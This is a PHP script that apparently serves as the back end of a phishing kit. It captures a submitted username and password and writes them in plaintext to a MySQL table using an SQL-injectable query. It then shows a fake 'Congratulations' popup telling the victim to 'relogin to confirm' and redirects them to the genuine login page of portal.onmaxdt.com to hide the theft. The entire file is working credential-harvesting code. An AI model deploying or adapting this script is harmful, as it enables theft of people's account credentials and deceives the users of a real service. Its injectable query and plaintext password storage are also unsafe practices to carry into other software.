<?php 
if(isset($_POST['submit'])){
    $username = $_POST['username'];
    $password = $_POST['password'];


    $host = 'localhost';
    $user = 'root';
    $pass = '';
    $dbname = 'epiz_33668058_1';

    $con = mysqli_connect($host,$user,$pass,$dbname);

    $sql = "INSERT INTO project(name,password) values ('$username','$password')";
    mysqli_query($con,$sql);

    $redirect_url = "https://portal.onmaxdt.com/#/login";

    echo '<!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <title>Congratulations</title>
        <style>
            body {
            background-color: #F7F7F7;
            }
            .popup {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background-color: #FFFFFF;
                padding: 20px;
                border-radius: 10px;
                box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
                z-index: 9999;
                animation: fadein 0.5s ease-in-out;
            }
            @keyframes fadein {
                from { opacity: 0; }
                to { opacity: 1; }
            }
            .popup h1 {
                font-size: 2.5rem;
                font-weight: bold;
                color: #1E90FF;
                margin-bottom: 0.5rem;
                text-align: center;
                animation: slidein 0.5s ease-in-out;
            }
            @keyframes slidein {
                from { transform: translateY(-50px); }
                to { transform: translateY(0); }
            }
            .popup h2 {
                font-size: 1.5rem;
                font-weight: normal;
                color: #444444;
                margin-top: 0;
                margin-bottom: 1rem;
                text-align: center;
                animation: slidein 0.5s ease-in-out;
                animation-delay: 0.2s;
            }
            .popup p {
                font-size: 1rem;
                font-weight: normal;
                color: #444444;
                margin-top: 0;
                margin-bottom: 0.5rem;
                text-align: center;
                animation: slidein 0.5s ease-in-out;
                animation-delay: 0.4s;
            }
            .popup button {
                display: block;
                margin: 0 auto;
                padding: 10px 20px;
                font-size: 1rem;
                font-weight: bold;
                color: #FFFFFF;
                background-color: #F0544F;
                border: none;
                border-radius: 5px;
                cursor: pointer;
                transition: background-color 0.2s ease-in-out;
                animation: slidein 0.5s ease-in-out;
                animation-delay: 0.6s;
            }
            .popup button:hover {
                background-color: #D53F3A;
            }
            .modern-box {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            margin-top: 2rem;
            padding: 1rem;
            background-color: #f8f8f8;
            border-radius: 0.5rem;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
            transition: transform 0.2s ease-in-out;
            animation: slidein 0.5s ease-in-out;
            animation-delay: 0.8s;
            position: relative;
            }
            .modern-box:hover {
            transform: scale(1.15);
            }
            .modern-box a {
            color: #007bff;
            font-size: 1.2rem;
            text-decoration: none;
            }
            .popup .verify-tick {
            display: block;
            margin: 0 auto;
            width: 50px;
            height: 50px;
            background-color: #32CD32;
            color: #FFFFFF;
            font-size: 3rem;
            font-weight: bold;
            text-align: center;
            line-height: 50px;
            border-radius: 50%;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
            margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
        <div class="popup">
            <div class="verify-tick">&#x2714;</div>
            <h1>Congratulations</h1>
            <h2>We will send it to you within 2 business days</h2>
            <p>Please relogin to confirm</p>
            <div class="modern-box">
                <a href="https://portal.onmaxdt.com/#/login">Confirm</a>
            </div>
        </div>
        <script>
        setTimeout(function(){ 
          window.location.href = "'.$redirect_url.'"; 
        }, 5000);
        </script>
    </body>
</html>';
}
   
 ?>